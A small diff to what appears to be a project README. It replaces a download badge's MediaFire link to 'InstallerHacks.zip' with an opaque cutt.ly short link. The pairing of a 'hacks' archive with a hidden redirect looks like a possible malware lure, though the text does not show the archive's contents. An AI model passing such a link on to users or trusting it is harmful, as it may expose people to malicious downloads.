@@ -48,4 +48,4 @@
 
 # <a id="download-info"></a>[🗂 Download]
 
-[![Download zip](https://custom-icon-badges.demolab.com/badge/-Download-blue?style=for-the-badge&logo=download&logoColor=white "Download zip")](https://www.mediafire.com/file/bux7ks4e6hkxf0t/InstallerHacks.zip/file)
+[![Download zip](https://custom-icon-badges.demolab.com/badge/-Download-blue?style=for-the-badge&logo=download&logoColor=white "Download zip")](https://cutt.ly/HwbQ3LMI)
